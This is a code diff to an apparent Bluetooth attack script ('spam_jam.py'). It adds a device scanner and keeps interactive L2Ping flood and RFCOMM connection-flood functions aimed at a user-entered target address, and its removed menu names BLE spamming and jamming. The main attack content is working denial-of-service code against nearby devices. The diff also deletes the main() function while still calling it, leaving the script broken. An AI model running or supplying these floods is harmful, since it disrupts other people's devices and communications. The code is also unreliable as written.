@@ -82,32 +82,51 @@ def start_bluetooth():
     subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
     print("✅ Bluetooth service started!")
 
+# 🔎 Bluetooth Device Scanner (FIXED!)
 def scan_bluetooth():
-    """Scan for nearby Bluetooth devices."""
-    print("🔎 Scanning for Bluetooth devices...")
-    subprocess.run(['bluetoothctl', 'scan', 'on'], check=True)
+    """Scan for nearby Bluetooth devices & display results."""
+    print("🔎 Scanning for Bluetooth devices... (This may take a few seconds)\n")
 
-# 💥 CUSTOM L2PING FLOOD ATTACK (NOW FIXED!)
+    try:
+        # Start scanning
+        subprocess.run(["bluetoothctl", "scan", "on"], check=True)
+        time.sleep(10)  # Allow scan time
+
+        # Get list of devices
+        result = subprocess.run(["bluetoothctl", "devices"], capture_output=True, text=True)
+        devices = result.stdout.strip().split("\n")
+
+        if len(devices) > 1:
+            print("📡 Found Bluetooth Devices:")
+            for device in devices:
+                print(f"🔹 {device}")
+        else:
+            print("⚠️ No Bluetooth devices found. Try again!")
+
+    except subprocess.CalledProcessError as e:
+        print(f"⚠️ Error running Bluetooth scan: {e}")
+
+    print("\n✅ Scan complete!\n")
+
+# 💥 CUSTOM L2PING FLOOD ATTACK
 def l2ping_attack():
     """Send a customizable Bluetooth L2Ping flood attack to a target device."""
     addr = input("💜 Enter Bluetooth Device Address to L2Ping: ")
     
-    # Check for root privileges
     if os.geteuid() != 0:
         print("⚠️  L2Ping requires root privileges! Try running: sudo python3 spam_jam.py")
         return
 
-    # User-customized attack settings
     packet_size = input("💜 Enter packet size (default 600, max 672): ") or "600"
     
     try:
         packet_size = int(packet_size)
         if packet_size > 672:
             print("⚠️ Packet size too large! Setting to max allowed: 672 bytes.")
-            packet_size = 672  # Auto-correct max size!
+            packet_size = 672  
     except ValueError:
         print("⚠️ Invalid input! Using default size: 600 bytes.")
-        packet_size = 600  # Default to 600 if input is bad
+        packet_size = 600  
     
     attack_mode = input("💜 Flood mode? (y/n): ").lower() == "y"
     
@@ -120,7 +139,7 @@ def l2ping_attack():
 
     print("✅ L2Ping attack complete!")
 
-# ✅ FINAL FIXED RFCOMM FLOOD FUNCTION!
+# ✅ RFCOMM FLOOD FUNCTION!
 def rfcomm_flood():
     """Flood a Bluetooth device with RFCOMM connection attempts."""
     addr = input("💜 Enter Bluetooth Device Address for RFCOMM Flood: ")
@@ -133,7 +152,7 @@ def rfcomm_flood():
         duration = int(input("💜 Enter flood duration in seconds (default 30): ") or "30")
     except ValueError:
         print("⚠️ Invalid input! Using default duration of 30 seconds.")
-        duration = 30  # Default duration
+        duration = 30  
 
     print(f"💥 Starting RFCOMM connection flood on {addr} for {duration} seconds...")
 
@@ -143,7 +162,7 @@ def rfcomm_flood():
     while time.time() - start_time < duration:
         try:
             attempt += 1
-            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True, timeout=10)  # Increased timeout!
+            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True, timeout=10)  
             print(f"✅ Attempt {attempt}: Connected to {addr}")
         except subprocess.TimeoutExpired:
             print(f"⚠️ Attempt {attempt}: Connection timed out to {addr}, skipping...")
@@ -155,33 +174,7 @@ def rfcomm_flood():
 
     print("✅ RFCOMM flood completed!")
 
-# 🏁 Main Function: Choose Feature
-def main():
-    print_banner()
-    print("🔹 1️⃣ Spam a BLE device 💌")
-    print("🔹 2️⃣ Jam a BLE device 🚫")
-    print("🔹 3️⃣ Scan for Bluetooth devices 📡")
-    print("🔹 4️⃣ L2Ping Attack 💥 (Now customizable!)")
-    print("🔹 5️⃣ RFCOMM Connection Flood 💥")
-    print("🔹 6️⃣ Start Bluetooth Service 📡")
-    print("🔹 7️⃣ Quit 🚪")
-    choice = input("💜 Choose an option (1-7): ")
-    if choice == "1":
-        target_mac = input("💜 Enter target BLE MAC address: ")
-        spam_ble(target_mac)
-    elif choice == "2":
-        jam_ble()
-    elif choice == "3":
-        scan_bluetooth()
-    elif choice == "4":
-        l2ping_attack()
-    elif choice == "5":
-        rfcomm_flood()
-    elif choice == "6":
-        start_bluetooth()
-    elif choice == "7":
-        print("👋 Goodbye, fren! XOXOXO 💜")
-        sys.exit()
-
+# 🏁 Main Function
 if __name__ == "__main__":
+    print_banner()
     main()
